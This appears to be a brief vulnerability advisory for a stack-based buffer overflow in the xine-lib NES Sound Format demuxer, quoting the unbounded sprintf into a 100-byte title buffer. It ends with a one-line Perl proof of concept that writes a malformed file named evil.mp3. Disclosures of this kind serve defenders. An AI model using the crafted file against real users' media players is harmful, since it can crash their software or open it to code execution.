Subject: xine-lib NSF demuxer buffer overflow

xine-lib <= 1.1.12 is prone to a stack-based buffer overflow in the NES 
Sound Format demuxer(demux_nsf.c).


- Code

open_nsf_file():

109: this->title = strdup(&header[0x0E]);

demux_nsf_send_chunk():

122: char title[100];
162: sprintf(title, "%s, song %d/%d",
            this->title, this->current_song, this->total_songs);


- Affected applications

- PoC

perl -e 'print 
"\x4E\x45\x53\x4D\x1A\x01\x01\x01\x80\x80\x18\x8A\x03\x8A" . "\x41" x 
114' > evil.mp3
